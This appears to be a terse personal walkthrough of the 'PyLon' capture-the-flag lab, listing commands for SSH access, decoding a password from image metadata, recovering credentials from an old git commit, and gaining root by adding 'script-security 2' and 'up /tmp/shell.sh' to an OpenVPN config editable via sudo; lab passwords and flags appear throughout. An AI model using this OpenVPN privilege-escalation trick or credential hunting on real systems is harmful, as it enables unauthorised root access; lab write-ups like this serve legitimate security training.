# PyLon 

> VOiD | Sunday 07 November 2021 10:59:47 PM IST

My IP : 10.8.253.221
Target IP : 10.10.176.40 



## PORT 222[ssh]
```bash
file pepper

ssh lone@10.10.176.40 -i lone_id_rsa -p 222


exiftool pepper.jpg
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)


pepper --> 2_[-I2_[0E2DmEK

Password for pylon.thm

        Username = lone
        Password = +2BRkRuE!w7>ozQ4            


Password for FLAG 1

        Username = FLAG 1
        Password = THM{homebrew_password_manager}            


```


## PORT 22 [SSH]
```bash
ssh  lone@10.10.176.40
lone@pylon:~$ cat user1.txt 
TMM{easy_does_it}

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn

lone@pylon:~/pylon$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da

python3 pyLon_pwMan.py

Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = zr7R0T]6zvYl*~OD            

lone@pylon:~$ cat note_from_pood
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is yn0ouE9JLR3h)`=I

Thanks again.

```


## USER [POOD]
```bash
pood@pylon:~$ cat user2.txt 
THM{homebrew_encryption_lol}

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn

add this 

script-security 2
up /tmp/shell.sh


root@pylon:/root# cat root.txt
ThM{OpenVPN_script_pwn}

```